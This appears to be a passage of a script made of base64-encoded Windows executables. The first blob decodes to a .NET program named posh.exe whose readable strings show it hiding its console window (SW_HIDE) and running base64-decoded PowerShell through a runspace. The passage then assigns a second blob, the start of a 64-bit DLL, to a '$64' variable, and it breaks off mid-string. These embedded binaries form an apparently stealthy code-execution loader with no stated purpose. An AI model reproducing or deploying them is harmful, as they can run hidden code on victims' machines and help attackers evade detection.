QQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEA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gABhAJ8ChQB5AMUCiwCBANoCIQAJAOICjwCJAPICjwCRAAADrgCZABQDswCRACUDuQAIAAQADQAIAAgAEgAuAAsAvwAuABMAyAA9AJMAJwE0AWkAeQAAAQMAQgABAAABBQBTAAIABIAAAAAAAAAAAAAAAAAAAAAA8AAAAAQAAAAAAAAAAAAAAAEAGwAAAAAAAQAAAAAAAAAAAAAAQgA/AQAAAAACAAAAAAAAAAAAAAABABsAAAAAAAAAAAAAPE1vZHVsZT4AcG9zaC5leGUAUHJvZ3JhbQBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AFNXX0hJREUAU1dfU0hPVwBHZXRDb25zb2xlV2luZG93AFNob3dXaW5kb3cALmN0b3IASW52b2tlQXV0b21hdGlvbgBSdW5QUwBNYWluAGhXbmQAbkNtZFNob3cAY21kAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBwb3NoAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBEbGxJbXBvcnRBdHRyaWJ1dGUAa2VybmVsMzIuZGxsAHVzZXIzMi5kbGwAU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbgBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlcwBSdW5zcGFjZUZhY3RvcnkAUnVuc3BhY2UAQ3JlYXRlUnVuc3BhY2UAT3BlbgBSdW5zcGFjZUludm9rZQBQaXBlbGluZQBDcmVhdGVQaXBlbGluZQBDb21tYW5kQ29sbGVjdGlvbgBnZXRfQ29tbWFuZHMAQWRkU2NyaXB0AFN5c3RlbS5Db2xsZWN0aW9ucy5PYmplY3RNb2RlbABDb2xsZWN0aW9uYDEAUFNPYmplY3QASW52b2tlAENsb3NlAFN5c3RlbS5UZXh0AFN0cmluZ0J1aWxkZXIAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMASUVudW1lcmF0b3JgMQBHZXRFbnVtZXJhdG9yAGdldF9DdXJyZW50AEFwcGVuZABTeXN0ZW0uQ29sbGVjdGlvbnMASUVudW1lcmF0b3IATW92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"
    $64="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